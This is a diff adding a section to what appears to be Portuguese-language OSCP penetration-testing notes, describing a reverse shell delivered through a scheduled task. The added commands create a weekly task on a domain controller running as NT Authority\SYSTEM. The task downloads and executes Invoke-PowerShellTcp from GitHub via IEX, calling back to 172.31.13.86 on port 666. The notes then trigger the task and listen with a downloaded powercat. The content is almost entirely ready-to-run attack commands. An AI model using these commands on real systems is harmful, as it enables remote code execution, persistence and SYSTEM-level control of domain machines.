@@ -1492,6 +1492,24 @@ AGUARDAR A CONEXÃO COM POWERCAT:
 IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/powercat.ps1")
 powercat -l -p 666 -v
 ```
+##### INVOKE-POWERSHELLTCP - SHELL REVERSO ATRAVÉS DE TAREFA AGENDADA
+```
+schtasks /create /S tech-dc01 /SC WEEKLY /RU "NT Authority\SYSTEM" /TN "REVERSESHELL" /TR "powershell.exe -c 'IEX(New-Object System.Net.WebClient).DownloadString(''https://github.com/n0ts0cial/oscp/raw/main/Invoke-PowerShellTcp2.ps1''')'"
+```
+ULTIMA LINHA DO ARQUIVO Invoke-PowerShellTcp2.ps1:
+```
+Invoke-PowerShellTcp -Reverse -IPAddress 172.31.13.86 -Port 666
+```
+RODAR A TAREFA:
+```
+schtasks /RUN /S tech-dc01 /TN "REVERSESHELL"
+```
+AGUARDAR A CONEXÃO:
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/powercat.ps1")
+powercat -l -p 666 -v
+```
+
 
 
 
